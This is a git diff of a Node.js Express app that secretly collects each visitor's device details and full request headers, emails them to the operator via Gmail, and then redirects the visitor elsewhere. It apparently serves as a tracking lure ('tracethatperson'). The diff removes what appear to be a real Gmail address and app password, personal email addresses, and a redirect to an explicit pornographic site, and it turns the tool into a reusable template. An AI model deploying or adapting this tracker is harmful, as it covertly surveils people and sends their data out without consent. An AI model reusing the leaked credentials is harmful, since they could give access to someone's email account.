@@ -12,8 +12,8 @@ app.use(device.capture());
 var transport = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: 'ben10sonic307@gmail.com',
-    pass: 'shlzkwpbjoreyngd',
+    user: 'add-your-mail-here',
+    pass: 'add-your-password-here',
   }
 });
 
@@ -37,10 +37,10 @@ app.get("/", function (req, res) {
     "cache-control"
   )} \r\n ${req.device.type.toUpperCase()} \r\n All Device Info: ${infoAll} \r\n \r\n Full Header: ${headersAll} `;
   const message = {
-    from: "tracethatperson@aol.com",
-    to: "yasharyan307@outlook.com",
+    from: "from-email-address",
+    to: "to-whowever-you-want-this-to-send",
     subject: "New Visitor",
-    text: `Hi Yash! A new user visited the social support app that you made. Here are the details. \n\r ${data}` // Plain text body
+    text: `Hi User! A new user visited the app that you made. Here are the details. \n\r ${data}` // Plain text body
   };
   transport.sendMail(message, function (err, info) {
     if (err) {
@@ -49,7 +49,7 @@ app.get("/", function (req, res) {
       console.log(`Message sent at ${datetime}`);
     }
   });
-  res.redirect("https://xhamster.desi/videos/bhabhi-riding-dick-was-fully-erected-and-was-prominently-vis-13477108");
+  res.redirect("https://www.example.com");  //enter whatever website you want them to redirect to
 });
 
 app.get("*", function (req, res) {
